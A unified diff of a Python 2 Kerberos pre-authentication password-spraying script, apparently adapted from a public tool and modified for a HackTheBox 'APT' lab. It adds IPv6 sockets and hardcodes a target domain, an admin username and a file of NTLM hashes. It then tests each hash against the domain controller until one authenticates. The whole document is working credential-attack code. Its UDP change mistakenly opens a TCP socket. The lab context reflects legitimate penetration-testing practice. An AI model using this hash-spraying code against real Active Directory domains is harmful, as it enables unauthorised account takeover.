@@ -10,8 +10,7 @@ from pyasn1.type.tag import Tag, tagClassContext, tagClassApplication, tagFormat
 from pyasn1.codec.der.encoder import encode
 from struct import pack, unpack
 from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType
-from Crypto.Cipher import ARC4
-from Crypto.Cipher import MD4, MD5
+from _crypto import ARC4, MD5, MD4
 from time import time, gmtime, strftime, strptime, localtime
 import hmac as HMAC
 from random import getrandbits, sample
@@ -19,6 +18,7 @@ from random import getrandbits, sample
 RC4_HMAC = 23
 NT_PRINCIPAL = 1
 NT_SRV_INST =2
+IP_VERSION = 4
 
 def random_bytes(n):
     return ''.join(chr(c) for c in sample(xrange(256), n))
@@ -200,14 +200,22 @@ def build_as_req(target_realm, user_name, key, current_time, nonce):
 def send_req_tcp(req, kdc, port=88):
     data = encode(req)
     data = pack('>I', len(data)) + data
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    global IP_VERSION
+    if(IP_VERSION == 4):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    else:
+       sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
     sock.connect((kdc, port))
     sock.send(data)
     return sock
 
 def send_req_udp(req, kdc, port=88):
     data = encode(req)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    global IP_VERSION
+    if(IP_VERSION == 4):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    else:
+       sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
     sock.connect((kdc, port))
     sock.send(data)
     return sock
@@ -254,8 +262,6 @@ def _decrypt_rep(data, key, spec, enc_spec, msg_type):
 
 def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):
 
-
-
     nonce = getrandbits(31)
     current_time = time()
     as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce)
@@ -266,7 +272,8 @@ def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):
         i=i+1
         if(i==18):
             if(ord(c)==0x0b):
-                print('[+] Valid Login: %s:%s'%(user_name,orgin_key))
+                return True
+
 
 def passwordspray_udp(user_realm, user_name, user_key, kdc_a, orgin_key):
 
@@ -286,56 +293,22 @@ def passwordspray_udp(user_realm, user_name, user_key, kdc_a, orgin_key):
    
 if __name__ == '__main__':
 
-    if len(sys.argv)!=7:
-        print('[!]Wrong parameter')
-        print('Use Kerberos pre-authentication to test a single password against a list of Active Directory accounts.')
-        print('Reference:')
-        print('  https://github.com/ropnop/kerbrute')
-        print('  https://github.com/mubix/pykek')
-        print('Author: 3gstudent')
-	print('Usage:')
-	print('	%s <domainControlerAddr> <domainName> <file> <passwordtype> <data> <mode>'%(sys.argv[0]))
-        print('<passwordtype>: clearpassword or ntlmhash')
-        print('<mode>: tcp or udp')
-	print('Eg.')
-	print('	%s 192.168.1.1 test.com user.txt clearpassword DomainUser123! tcp'%(sys.argv[0]))
-	print('	%s 192.168.1.1 test.com user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp'%(sys.argv[0]))
-	sys.exit(0)
-    else:
-        kdc_a = sys.argv[1]
-        user_realm = sys.argv[2].upper()
-        print('[*] DomainControlerAddr: %s'%(kdc_a))
-        print('[*] DomainName:          %s'%(user_realm))
-        print('[*] UserFile:            %s'%(sys.argv[3]))
+    global IP_VERSION
+    IP_VERSION = 6
+    ip = "apt"
+    domain = "htb.local"
+    user = "henry.vinson_adm"
+    hash_file_path = "/home/p4cm4n/Pentest_Learning/HackTheBox/APT/userhashes"
 
-        
-        if sys.argv[4]=='clearpassword':
-            print('[*] ClearPassword:       %s'%(sys.argv[5]))
-            user_key = (RC4_HMAC, ntlm_hash(sys.argv[5]).digest())
             
-        elif sys.argv[4]=='ntlmhash':
-            print('[*] NTLMHash:            %s'%(sys.argv[5]))
-            user_key = (RC4_HMAC, sys.argv[5].decode('hex'))
-            
-        else:
-            print('[!]Wrong parameter of <passwordtype>')
-            sys.exit(0)     
+    with open(hash_file_path, 'r') as hash_file:
+        for _user_hash in hash_file:            
+            user_hash = _user_hash.strip('\r\n')
+            user_key = (RC4_HMAC, user_hash.decode('hex'))
 
-        file_object = open(sys.argv[3], 'r')
-
-        if sys.argv[6]=='tcp':
-            print('[*] Using TCP to test a single password against a list of Active Directory accounts.')
-            for line in file_object:
-                passwordspray_tcp(user_realm, line.strip('\r\n'), user_key, kdc_a, sys.argv[5])
-        elif sys.argv[6]=='udp':
-            print('[*] Using UDP to test a single password against a list of Active Directory accounts.')  
-            for line in file_object:
-                passwordspray_udp(user_realm, line.strip('\r\n'), user_key, kdc_a, sys.argv[5])
-        else:
-            print('[!]Wrong parameter of <mode>')
-            sys.exit(0)     
-
-
-        print('All done.')
-        
-
+            try:
+                if(passwordspray_tcp(domain, user, user_key, ip, user_hash)):
+                    print "Success. Working hash: " + user_hash
+                    exit(0)
+            except Exception as ex:
+                print "fail : " + user_hash      
